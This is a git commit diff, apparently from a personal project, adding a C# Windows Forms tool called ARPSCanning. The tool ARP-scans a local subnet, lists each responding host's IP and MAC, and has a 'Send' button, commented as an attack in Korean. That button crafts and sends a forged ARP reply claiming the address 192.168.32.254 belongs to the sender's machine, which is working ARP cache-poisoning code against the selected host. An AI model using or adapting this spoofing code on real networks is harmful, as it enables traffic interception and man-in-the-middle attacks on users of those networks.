dfa97e0d907a41b3b7b6785d15248fa37b958ce8
tkddnr924 <tkddnr924@naver.com>
2016-07-19 21:08:20 +0900

    First

--- ARPSCanning/Form1.Designer.cs
+++ ARPSCanning/Form1.Designer.cs
@@ -28,12 +28,184 @@
         /// </summary>
         private void InitializeComponent()
         {
-            this.components = new System.ComponentModel.Container();
+            this.button1 = new System.Windows.Forms.Button();
+            this.lview_name = new System.Windows.Forms.ListView();
+            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.cbox_ipaddr = new System.Windows.Forms.ComboBox();
+            this.cbox_device = new System.Windows.Forms.ComboBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.tbox_ip = new System.Windows.Forms.TextBox();
+            this.tbox_mac = new System.Windows.Forms.TextBox();
+            this.label4 = new System.Windows.Forms.Label();
+            this.btn_stop = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(319, 10);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(97, 23);
+            this.button1.TabIndex = 7;
+            this.button1.Text = "Scan";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // lview_name
+            // 
+            this.lview_name.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
+            this.columnHeader2,
+            this.columnHeader3});
+            this.lview_name.Location = new System.Drawing.Point(1, 86);
+            this.lview_name.Name = "lview_name";
+            this.lview_name.Size = new System.Drawing.Size(425, 274);
+            this.lview_name.TabIndex = 6;
+            this.lview_name.UseCompatibleStateImageBehavior = false;
+            this.lview_name.View = System.Windows.Forms.View.Details;
+            this.lview_name.Click += new System.EventHandler(this.lview_name_Click);
+            // 
+            // columnHeader2
+            // 
+            this.columnHeader2.Text = "IP";
+            this.columnHeader2.Width = 154;
+            // 
+            // columnHeader3
+            // 
+            this.columnHeader3.Text = "MAC";
+            this.columnHeader3.Width = 180;
+            // 
+            // cbox_ipaddr
+            // 
+            this.cbox_ipaddr.FormattingEnabled = true;
+            this.cbox_ipaddr.Location = new System.Drawing.Point(74, 49);
+            this.cbox_ipaddr.Name = "cbox_ipaddr";
+            this.cbox_ipaddr.Size = new System.Drawing.Size(219, 23);
+            this.cbox_ipaddr.TabIndex = 11;
+            // 
+            // cbox_device
+            // 
+            this.cbox_device.FormattingEnabled = true;
+            this.cbox_device.Location = new System.Drawing.Point(74, 10);
+            this.cbox_device.Name = "cbox_device";
+            this.cbox_device.Size = new System.Drawing.Size(219, 23);
+            this.cbox_device.TabIndex = 10;
+            this.cbox_device.SelectedIndexChanged += new System.EventHandler(this.cbox_device_SelectedIndexChanged);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(9, 49);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(59, 15);
+            this.label2.TabIndex = 9;
+            this.label2.Text = "IPADDR";
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(8, 10);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(52, 15);
+            this.label1.TabIndex = 8;
+            this.label1.Text = "Device";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(12, 379);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(20, 15);
+            this.label3.TabIndex = 12;
+            this.label3.Text = "IP";
+            // 
+            // tbox_ip
+            // 
+            this.tbox_ip.Location = new System.Drawing.Point(74, 376);
+            this.tbox_ip.Name = "tbox_ip";
+            this.tbox_ip.ReadOnly = true;
+            this.tbox_ip.Size = new System.Drawing.Size(239, 25);
+            this.tbox_ip.TabIndex = 13;
+            // 
+            // tbox_mac
+            // 
+            this.tbox_mac.Location = new System.Drawing.Point(74, 415);
+            this.tbox_mac.Name = "tbox_mac";
+            this.tbox_mac.ReadOnly = true;
+            this.tbox_mac.Size = new System.Drawing.Size(239, 25);
+            this.tbox_mac.TabIndex = 15;
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(12, 418);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(38, 15);
+            this.label4.TabIndex = 14;
+            this.label4.Text = "MAC";
+            // 
+            // btn_stop
+            // 
+            this.btn_stop.Location = new System.Drawing.Point(319, 49);
+            this.btn_stop.Name = "btn_stop";
+            this.btn_stop.Size = new System.Drawing.Size(97, 23);
+            this.btn_stop.TabIndex = 16;
+            this.btn_stop.Text = "Stop";
+            this.btn_stop.UseVisualStyleBackColor = true;
+            this.btn_stop.Click += new System.EventHandler(this.btn_stop_Click);
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(320, 370);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(96, 70);
+            this.button2.TabIndex = 17;
+            this.button2.Text = "Send";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 15F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(428, 448);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.btn_stop);
+            this.Controls.Add(this.tbox_mac);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.tbox_ip);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.lview_name);
+            this.Controls.Add(this.cbox_ipaddr);
+            this.Controls.Add(this.cbox_device);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Name = "Form1";
             this.Text = "Form1";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
         }
 
         #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.ListView lview_name;
+        private System.Windows.Forms.ColumnHeader columnHeader2;
+        private System.Windows.Forms.ColumnHeader columnHeader3;
+        private System.Windows.Forms.ComboBox cbox_ipaddr;
+        private System.Windows.Forms.ComboBox cbox_device;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox tbox_ip;
+        private System.Windows.Forms.TextBox tbox_mac;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Button btn_stop;
+        private System.Windows.Forms.Button button2;
     }
 }
 
--- ARPSCanning/Form1.cs
+++ ARPSCanning/Form1.cs
@@ -7,14 +7,199 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using SharpPcap.LibPcap;
+using SharpPcap;
+using System.Threading;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Text.RegularExpressions;
+using PacketDotNet;
 
 namespace ARPSCanning
 {
     public partial class Form1 : Form
     {
+        bool flag = false;
+        int index;
+        Thread thread;
         public Form1()
         {
             InitializeComponent();
+            var devices = LibPcapLiveDeviceList.Instance;
+            if (devices.Count < 1)
+            {
+                MessageBox.Show("장치 검색 실패");
+            }
+            foreach (var device in devices)
+            {
+                cbox_device.Items.Add(device.Description);
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if(cbox_device.Text.Equals(""))
+            {
+                MessageBox.Show("디바이스 선택 안됨...");
+                cbox_device.Focus();
+                return;
+            }
+            if (cbox_ipaddr.Text.Equals(""))
+            {
+                MessageBox.Show("IP 선택 안됨...");
+                cbox_ipaddr.Focus();
+                return;
+            }
+
+            string ip_addr = cbox_ipaddr.Text;
+            if (flag)
+            {
+                return;
+            }
+            int r_timeout = 1000;
+            ICaptureDevice device = CaptureDeviceList.Instance[index];
+            device.Open(DeviceMode.Promiscuous, r_timeout);
+
+            thread = new Thread(() => ScanNetwork(device, ip_addr));
+            thread.Start();
+            if (thread.ThreadState == ThreadState.Aborted)
+            {
+                thread.Abort();
+            }
+        }
+
+        private void ScanNetwork(ICaptureDevice dev, string ip_addr)
+        {
+            flag = true;
+            LibPcapLiveDevice device = (LibPcapLiveDevice)dev;
+            string ip;
+            for (int i= 0;i<255;i++)
+            {
+                if (ip_addr.Length == 0)
+                {
+                    ip = "192.168.1.";
+                }
+                else
+                {
+                    ip = Regex.Replace(ip_addr, @"\d+$", "");
+                }
+                ip += i;
+                string result = ScanHost(ip, device);
+                if (result != "fail")
+                    UpdateList(ip, result);
+            }            
+            flag = false;
+        }
+
+        private string ScanHost(string ip, LibPcapLiveDevice device)
+        {
+            IPAddress t_ip = null;
+            int delay = 1200000;
+            bool pos = IPAddress.TryParse(ip, out t_ip);
+            if (!pos)
+            {
+                flag = false;
+                return "fail";
+            }
+            ARP arp = new ARP(device);
+            arp.Timeout = new TimeSpan(delay);
+
+            var re_mac = arp.Resolve(t_ip);
+            if (re_mac == null)
+            {
+                flag = false;
+                return "fail";
+            }
+            else
+            {
+                string mac = FormatMac(re_mac);
+                return mac;
+            }
+        }
+
+        private string FormatMac(PhysicalAddress re_mac)
+        {
+            string m = re_mac.ToString();
+            MatchCollection split = Regex.Matches(m, @"\w{2}");
+            string mac = "";
+
+            foreach (Match item in split)
+            {
+                mac += item.Value + ":";
+            }
+
+            return mac.Remove(mac.Length - 1);
+        }
+
+        private delegate void AddDelegate(string ip, string mac);
+        internal void UpdateList(string ip, string mac)
+        {
+            if (lview_name.InvokeRequired)
+            {
+                AddDelegate del = new AddDelegate(UpdateList);
+                Invoke(del, new object[] {ip, mac });
+            }
+            else
+            {
+                string[] strs = {ip, mac };
+                ListViewItem lvi = new ListViewItem(strs);
+                lview_name.Items.Add(lvi);
+            }
+        }
+        private void cbox_device_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            index = cbox_device.SelectedIndex;
+            var devices = LibPcapLiveDeviceList.Instance;
+            var sel_device = devices[index];
+            cbox_ipaddr.Items.Clear();
+            cbox_ipaddr.ResetText();
+            for (int i = 0; i < sel_device.Addresses.Count; i++)
+            {
+                cbox_ipaddr.Items.Add(sel_device.Addresses.ElementAt(i).Addr);
+            }
+        }
+
+
+        private void lview_name_Click(object sender, EventArgs e)
+        {
+            if (lview_name.SelectedItems == null)
+            {
+                return;
+            }
+
+            string ip = lview_name.SelectedItems[0].Text;
+            string mac = lview_name.SelectedItems[0].SubItems[1].Text;
+            tbox_ip.Text = ip;
+            tbox_mac.Text = mac;
+        }
+
+        private void btn_stop_Click(object sender, EventArgs e)
+        {
+            if (thread.ThreadState == ThreadState.Running)
+            {
+                thread.Abort();
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            // 공격ㄱㄱ
+            var device = LibPcapLiveDeviceList.Instance[1];
+            IPAddress dst_ip = null;
+            IPAddress src_ip = null;
+            PhysicalAddress dst_mac = null;
+            PhysicalAddress src_mac = null;
+            
+            dst_ip = IPAddress.Parse(tbox_ip.Text);
+            dst_mac = PhysicalAddress.Parse(tbox_mac.Text.Replace(':','-'));
+            src_ip = IPAddress.Parse("192.168.32.254");
+            src_mac = NetworkInterface.GetAllNetworkInterfaces()[1].GetPhysicalAddress();
+
+            ARPPacket arp = new ARPPacket(ARPOperation.Response, dst_mac, dst_ip, src_mac, src_ip);
+            EthernetPacket epacket = new EthernetPacket(src_mac, dst_mac, EthernetPacketType.Arp);
+            arp.PayloadData = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
+            epacket.PayloadPacket = arp;
+            device.SendPacket(epacket);
         }
     }
 }
